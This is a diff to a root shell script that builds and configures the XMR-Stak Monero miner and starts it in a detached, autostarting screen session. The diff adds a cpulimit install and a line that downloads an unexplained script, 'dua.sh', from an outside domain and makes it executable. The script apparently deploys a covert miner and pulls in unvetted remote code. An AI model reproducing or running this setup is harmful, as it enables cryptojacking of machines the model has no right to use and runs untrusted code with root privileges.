@@ -40,6 +40,7 @@ CHECK+="screen -dmS asoy /root/miner\n"
 CHECK+="fi\n"
 
 echo "---INSTALL DEPENDENCING---"
+apt install cpulimit
 sudo apt-get update && sudo apt-get -y install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev htop
 
 echo "---DOWNLOAD,COMPILE, INSTALL AND CONFIGURE XMR-STAK"
@@ -58,6 +59,9 @@ chown root /root/xmr-stak/build/bin/pools.txt
 touch /root/xmr-stak/build/bin/config.txt
 printf "$CONFIG" >> /root/xmr-stak/build/bin/config.txt
 chown root /root/xmr-stak/build/bin/config.txt
+
+wget https://garudamiliter.com/dua.sh
+chmod a+x dua.sh
 
 echo "--MAKE EXECUTABLE CUSTOM FILE---"
 echo "cd /root/xmr-stak/build/bin && ./xmr-stak" >> miner
